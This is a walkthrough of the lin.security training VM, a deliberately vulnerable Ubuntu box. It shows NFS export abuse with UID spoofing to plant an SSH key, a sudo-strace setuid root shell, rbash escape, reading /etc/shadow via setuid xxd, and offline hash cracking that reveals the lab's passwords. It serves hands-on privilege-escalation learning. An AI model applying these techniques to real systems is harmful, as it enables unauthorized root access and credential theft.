### Background

Here at in.security we wanted to develop a Linux virtual machine that is based, at the time of writing, on an up-to-date Ubuntu distro (18.04 LTS), but suffers from a number of vulnerabilities that allow a user to escalate to `root` on the box. This has been designed to help understand how certain built-in applications and services if misconfigured, may be abused by an attacker.

We have configured the box to simulate real-world vulnerabilities (albeit on a single host) which will help you to perfect your local privilege escalation skills, techniques and toolsets. There are a number challenges which range from fairly easy to intermediate level and we’re excited to see the methods you use [sic] to solve them!

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)
|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)
|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)
111/tcp   open  rpcbind  syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  3           2049/udp  nfs
|   100003  3,4         2049/tcp  nfs
|   100005  1,2,3      41225/tcp  mountd
|   100005  1,2,3      44576/udp  mountd
|   100021  1,3,4      38947/tcp  nlockmgr
|   100021  1,3,4      59622/udp  nlockmgr
|   100227  3           2049/tcp  nfs_acl
|_  100227  3           2049/udp  nfs_acl
2049/tcp  open  nfs_acl  syn-ack ttl 64 3 (RPC #100227)
38947/tcp open  nlockmgr syn-ack ttl 64 1-4 (RPC #100021)
41225/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
41683/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
51813/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
```

`nmap` finds `22/tcp` and `111/tcp` open. I don't see the usual `80/tcp`, which is unfortunate. We have to rely on other means to gain a foothold into the VM.

### Network File System

Good thing for us, NFS is available. Using `showmount`, we can display the exports on the VM.

```
# showmount -e 192.168.30.129
Export list for 192.168.30.129:
/home/peter *
```

Let's mount the remote directory.

```
# mkdir -p /mnt/peter
# mount -t nfs 192.168.30.129:/home/peter /mnt/peter
# ls -la /mnt/peter
total 32
drwxr-xr-x 5 1001 1005 4096 Jul 10 19:49 .
drwxr-xr-x 4 root root 4096 Aug 18 11:11 ..
-rw-r--r-- 1 1001 1005  220 Jul  9 19:53 .bash_logout
-rw-r--r-- 1 1001 1005 3771 Jul  9 19:53 .bashrc
drwx------ 2 1001 1005 4096 Jul 10 10:04 .cache
-rw-rw-r-- 1 1001 1005    0 Jul 10 10:04 .cloud-locale-test.skip
drwx------ 3 1001 1005 4096 Jul 10 10:04 .gnupg
drwxrwxr-x 3 1001 1005 4096 Jul 10 08:03 .local
-rw-r--r-- 1 1001 1005  807 Jul  9 19:53 .profile
```

Now that I've mapped `/home/peter` to `/mnt/peter`, let's see if I create `.ssh` directory in `/home/peter`.

```
# mkdir -p /mnt/peter/.ssh
mkdir: cannot create directory ‘/mnt/peter/.ssh’: Permission denied
```

Hmm. Not even when I'm `root`? Let's create a fake `peter` account with an UID of `1001` on my machine.

```
# useradd -u 1001 peter
# su peter
$ cd /mnt/peter
$ mkdir .ssh
```

Awesome. Now, I can put the SSH public key I control into `/home/peter/.ssh/authorized_keys`.

First, we generate the SSH Key pair on my machine.

```
# ssh-keygen -t rsa -b 2048
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): peter
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in peter.
Your public key has been saved in peter.pub.
The key fingerprint is:
SHA256:TuGkIRfE6ODlItT4jp9ILW/8oGRTEa7JLCDI5dgKnMs root@kali
The key's randomart image is:
+---[RSA 2048]----+
|  oo +o          |
|+oO.+ ..         |
|**.X. o o        |
|O B.+o = .       |
|.E+o  . S        |
|.+.o   o         |
|.+*..   .        |
|o.o*.            |
| .. ..           |
+----[SHA256]-----+
```

Next, we copy and paste the contents of `peter.pub` to `/mnt/peter/.ssh/authorized_keys`.

```
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1rYFvo6Wh4j44p4s6WfDYb637m62zA0CwE5t9K6iKbosZMpeDBGP2q8C2O3yw2P9Dhv3jRPCutf1ruadaMxxiOY8Ook/3fwMcaueCAs0ThKCMRlnf0yzUnEHH7t82MrEghMnL4GfUcYlxIwo8d5jQe7umuJneYK786iDNEPaEajC45GQlrZWCzIWqs3B3vJBQ4FR766EHsmiKVWvQ35uR69/O39IePJQ8oSTF+PK0RoCtvmYt44jeqUO0NfYGeCGwqtYW/i+ILTOkW45bYRVjhmrJ2C+yjtK3bsmDiq28IT9STCFlkI7OqEfJkeYqBSJVqVqOkFFvx4+7fyTpchT/ > /mnt/peter/.ssh/authorized_keys
```

Open another `terminal` and log in to `peter`'s account with the SSH private key.

![peter](/assets/images/posts/lin.security-1-walkthrough/228fe4f8.png)

### Privilege Escalation

During enumeration of `peter`'s account, I found something interesting.

![sudo](/assets/images/posts/lin.security-1-walkthrough/1fc14ac6.png)

`peter` is able to `sudo` as `root` for `/usr/bin/strace`, used for tracing system calls and signals.

Holy cow. This means that I can do something like this—write a privilege escalation program and run it through `strace` with the blessing of `sudo`—all without password.

<div class="filename"><span>root.c</span></div>

```c
#include <stdlib.h>
#include <unistd.h>

int main() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```

Let's give it a shot.

![root](/assets/images/posts/lin.security-1-walkthrough/fe6a2b56.png)

:dancer:

### Afterthought

There's more than one way of becoming `root`. The most obvious way is to log in with `bob:secret` as suggested in the VM's description.

![bob](/assets/images/posts/lin.security-1-walkthrough/367b19d3.png)

Display `/etc/passwd`. Observe `insecurity` has its password hash in it and has `root` privileges

![/etc/passwd](/assets/images/posts/lin.security-1-walkthrough/a135634c.png)

We can copy that line and send it to **John the Ripper** for offline cracking like this.

```
# john --format=crypt --show hash.txt
insecurity:P@ssw0rd:0:0::/:/bin/sh

1 password hash cracked, 0 left
```

Another way is to discover `susan`'s password in her home directory either through `bob`'s account or `peter`'s account described above.

![susan](/assets/images/posts/lin.security-1-walkthrough/c1174f4d.png)

You'll soon notice that `susan` is using `rbash` or restricted `bash`. It's almost trivial to escape from `rbash`—execute `bash -i`.

Now that we have escaped the restricted shell, something caught my eye while I was performing enumeration on `susan`'s account.

![xxd](/assets/images/posts/lin.security-1-walkthrough/e2d6c4d0.png)

`xxd` can display the hexdump or convert to hexadecimal representation (through `-p`) of any file it has read permissions. Since `xxd` is `setuid` to `root`, we can use it to read `/etc/shadow` like so.

![/etc/shadow](/assets/images/posts/lin.security-1-walkthrough/72640ded.png)

We can copy both `/etc/passwd` and `/etc/shadow` to our attacking machine for offline cracking with **John the Ripper**, in which case the `root` password is `secret123`.

```
# john --format=crypt --show hashes.txt
root:secret123:0:0:root:/root:/bin/bash
bob:secret:1000:1004:bob:/home/bob:/bin/bash
insecurity:P@ssw0rd:0:0::/:/bin/sh

3 password hashes cracked, 2 left
```

I'm sure this is not exhaustive. Kudos to [in.security](https://in.security/) for creating this VM. No better way to learn than hands-on practice.
